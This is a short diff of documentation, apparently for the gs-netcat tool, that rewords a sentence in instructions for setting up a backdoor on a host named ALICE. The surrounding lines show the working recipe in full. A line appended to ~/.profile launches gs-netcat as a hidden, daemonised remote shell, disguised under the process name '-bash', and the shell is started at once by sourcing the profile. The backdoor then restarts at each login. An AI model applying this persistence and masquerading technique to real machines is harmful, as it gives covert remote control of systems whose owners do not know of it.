@@ -16,7 +16,7 @@ On "ALICE" add the following line to the end of *~/.profile*. This will start th
 killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleKeyXXXXChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
 ```
 
-Immediately start the backdoor:
+Start the backdoor manually for testing. Thereafter the backdoor will start (and remain running) whenever ALICE logs in for the first time:
 ```ShellSession
 alice@ALICE:~$ source ~/.profile
 ```
